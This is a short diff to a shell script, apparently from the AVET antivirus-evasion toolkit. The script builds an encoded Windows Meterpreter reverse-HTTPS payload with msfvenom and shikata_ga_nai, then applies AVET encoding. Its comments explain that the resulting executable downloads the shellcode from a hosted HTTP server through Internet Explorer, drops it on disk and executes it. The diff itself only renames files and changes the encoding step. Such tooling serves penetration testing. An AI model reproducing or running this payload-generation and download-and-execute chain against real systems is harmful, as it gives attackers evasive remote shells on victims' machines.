@@ -24,10 +24,10 @@ LPORT=$GLOBAL_LPORT
 LHOST=$GLOBAL_LHOST
 
 # make meterpreter reverse payload, encoded with shikata_ga_nai
-msfvenom -p windows/meterpreter/reverse_https lhost=$LHOST lport=$LPORT -e x86/shikata_ga_nai -i 2 -f c -a x86 --platform Windows > output/sc.txt
+msfvenom -p windows/meterpreter/reverse_https lhost=$LHOST lport=$LPORT -e x86/shikata_ga_nai -i 2 -f c -a x86 --platform Windows > input/sc_c.txt
 
-# Apply AVET encoding via format.sh tool
-./tools/format.sh output/sc.txt > output/scclean.txt
+# Apply AVET encoding
+encode_shellcode avet input/sc_c.txt output/scenc_raw.txt
 
 # set shellcode source
 set_shellcode_source download_internet_explorer
@@ -53,7 +53,7 @@ cleanup_techniques
 
 # The generated msf shellcode file needs to be hosted on a HTTP server.
 # Call the generated executable like:
-# output.exe http://myserver/scclean.txt
+# output.exe http://myserver/scenc_raw.txt
 # The executable will then download the shellcode file via internet explorer and drop the file on disk.
 # The shellcode is then read from the file and executed.
 
